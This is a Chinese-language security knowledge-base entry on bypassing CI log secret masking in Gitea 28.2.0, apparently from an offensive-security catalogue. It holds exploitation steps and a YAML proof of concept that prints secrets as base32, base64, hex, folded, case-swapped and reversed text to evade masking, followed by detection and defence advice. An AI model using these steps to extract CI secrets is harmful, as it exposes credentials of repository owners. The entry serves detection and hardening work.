---
id: cloud-cicd-log-masking-bypass-base32-variant-threshold
title: CI 日志脱敏绕过：base32 不在掩码变体集合内，base64 折行反被 4 字符分组对齐规则啃成残片（Gitea 28.2.0 实测）
type: scenario
domain: cloud
path: cloud/ci-cd
technique: ci-log-secret-masking-bypass-encoding-variant-alignment-threshold
tags:
- cloud
- ci-cd
- gitea
- github-actions
- secrets
- log-masking
- encoding
- detection-evasion
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:38:58+08:00'
  notes: 已对照原文及图2/图3核对：变体集合=原值+标准base64；base32/hex/fold/大小写/反转/URL-safe/折行未完整脱敏；退化规则按4字符分组、阈值12字符、起点对齐（P1/P2/P5/P6 与 Y1-Y3 反事实数据均一致）。未验证点：结论仅对 Gitea 28.2.0 实测成立，其他平台需重测；原文无 CVE/受影响版本区间。
url: /docs/cloud/ci-cd/cloud-cicd-log-masking-bypass-base32-variant-threshold/
draft: false
kb_aliases:
- 日志脱敏绕过
- secrets masking bypass
- base32
- base64 变体
- 12 字符阈值
- 4 字符分组对齐
- Gitea 28.2.0
- '***'
---

## 一句话结论

Gitea 28.2.0 的 CI 日志脱敏只注册「密钥原值 + 标准 base64」并按“整串优先、失败后退化为 4 字符分组对齐且不短于 12 字符”的规则替换；base32 不在变体集合内，完整的 `toJSON(secrets)` 用 base32 输出可零替换带走，而 base64 折行（行长 ≥12 且为 4 的倍数）会被逐行啃成 `"S26"`、空串这类残片。

## 原理

原文在自建 Gitea 28.2.0 上用探针作业测绘出三条匹配规则：

1. **变体集合**：注册项 = 密钥原值 + 其标准 base64 变体（带填充、单行连续出现才命中）。base32、hex 等不在预计算集合内。
2. **子串替换**：命中段替换为 `***`，是纯字符串处理，不理解语义；折行、分片会切断连续匹配。
3. **退化匹配与阈值**：整段变体未命中时，引擎按 base64 四字符分组做对齐最长匹配，长度阈值 12 个 base64 字符（3 个完整分组、约 9 字节明文），且起点必须对齐到分组边界；低于阈值或错开一位都不替换。

实测的十一种输出形态中，原值与标准 base64 单行被脱敏；base32、hex、`fold -w 8` 分片、大小写互换、反转、base64 URL-safe、base64 折行均未完整脱敏。base64 去填充形态出现“部分命中”（如 `U0FO***fg`），证明退化规则按 4 字符分组啃食。

**载荷尺度决定编码选择**：Gheist 打印的是整份 `toJSON(secrets)`（几百字节 JSON），不是单枚短密钥：

```text
base32 -w 120 -> 1192 字符，替换 0 处，完整还原 DB_PASSWORD
base64 -w 120 ->  757 字符，替换 7 处，DB_PASSWORD 只剩 "S26"
base64 -w 480 ->  650 字符，替换 8 处，DB_PASSWORD "S26"、DEPLOY_TOKEN 空串
```

原因：base64 折行后每行行首都是 4 字符分组对齐起点，且 120/480 都是 4 的倍数、远超 12 字符阈值，于是每一行都被退化规则啃掉一段；base32 不在变体集合内，退化规则无从触发。反过来 `base64 -w 10` 每行只有 10 字符，低于阈值，整行逃逸——**折行既可能救下密文，也可能毁掉密文，分界线就是 12 字符阈值与 4 字符分组对齐**。

因此攻击者选择编码的约束是：不在平台脱敏预计算集合内、字母表能安全穿过分支名/文件名/URL 的受限字符集。base32 同时满足两条（A-Z、2-7、`=`），base64 既在集合内又带 `+`、`/`、`=`。

## 触发条件

- 目标平台的日志脱敏实现与实测一致（Gitea 28.2.0 为原文实测版本；其他平台需按同样方法重新测绘）。
- 攻击者可让作业把 secrets 输出到运行日志（具备仓库写权限并 push workflow）。
- 输出内容与密钥原值/标准 base64 不构成整串连续匹配；选择 base32 或控制折行宽度可稳定绕过。
- 该规则只作用于日志显示层，不影响 secrets 实际注入与读取。

## 利用步骤

1. 在目标平台建探针分支，用若干步骤输出同一枚测试密钥的不同变换：原值、base32、base64（单行/不同 `-w` 折行）、hex、分片、大小写互换、反转、去填充/URL-safe。
2. 观察运行日志中哪些被替换成 `***`、哪些部分命中，确定该平台的变体集合、是否按 4 字符分组退化、阈值是多少字符。
3. 选择不在变体集合内的编码（通常 base32）；若只能用 base64，则用小于阈值的行长折行（如 `-w 10`）使每行逃逸，或避开 4 的倍数对齐。
4. 按选定编码输出整份 `toJSON(secrets)` 与环境变量，按填充符分段；回传端解码还原。
5. 用测绘结论评估其他平台：同一套探针可在几分钟内得出该平台专属的脱敏边界。

## PoC

```yaml
# 探针：同一密钥的多种变换（原文节选）
- name: V1 plaintext
  run: echo "V1 ${{ secrets.DB_PASSWORD }}"
- name: V2 base32
  run: echo -n "${{ secrets.DB_PASSWORD }}" | base32 -w 120; echo
- name: V3 base64
  run: echo -n "${{ secrets.DB_PASSWORD }}" | base64 -w 120; echo
- name: V4 hex
  run: echo -n "${{ secrets.DB_PASSWORD }}" | od -An -tx1 | tr -d ' \n'; echo
- name: V5 chunked
  run: echo "${{ secrets.DB_PASSWORD }}" | fold -w 8
- name: V6 case swap
  run: echo "${{ secrets.DB_PASSWORD }}" | tr 'A-Za-z' 'a-zA-Z'; echo
- name: V7 reversed
  run: echo -n "${{ secrets.DB_PASSWORD }}" | rev; echo
```

```text
# 分组对齐对照（同一 base64 变体的子串）
P1[REJPWC1Qdz8+]   -> P1[***]          12 字符、对齐起点：命中
P2[REJPWC1Qdz8]    -> P2[REJPWC1Qdz8]  11 字符：未命中
P5[EJPWC1Qdz8+]    -> P5[EJPWC1Qdz8+]  11 字符且非对齐起点：未命中
P6[REJPWC1Qdz8+fg] -> P6[***fg]        14 字符，仅前 12 字符对齐段被替换
```

## 变体与关联

- 未脱敏形态：base32（任意折行）、hex、`fold -w 8` 分片、大小写互换、反转、base64 URL-safe、base64 折行；base64 去填充会部分命中。
- 折行双刃：`-w 10` 低于阈值逃逸；`-w 120/480`（≥阈值且 4 的倍数）逐行被啃。
- 完整外带链见 [[cloud-cicd-actions-log-base32-secret-exfiltration-no-c2]]。
- 检测侧应对：金丝雀“先解码再比对”，不依赖编码指纹；静态规则检测 `secrets` 引用与编码命令同现。

## 检测与防御

- **检测**：不要把“日志里出现高熵/编码串”当判据——合法作业中 base32/base64 随处可见；应检测 `secrets` 上下文被编码后输出（静态规则 + 变更来源上下文），并对日志做解码后的金丝雀比对。
- **防御**：不要依赖平台脱敏保护密钥；收敛能写 workflow 的权限；密钥分域与环境隔离；部署业务不引用的金丝雀密钥；发现编码外带后立即轮换全部可达密钥。
- **平台侧**：脱敏应覆盖常见编码变体并作用于解码后内容，但根本上仍应把 secrets 隔离在不可被任意 workflow 读取的边界内。
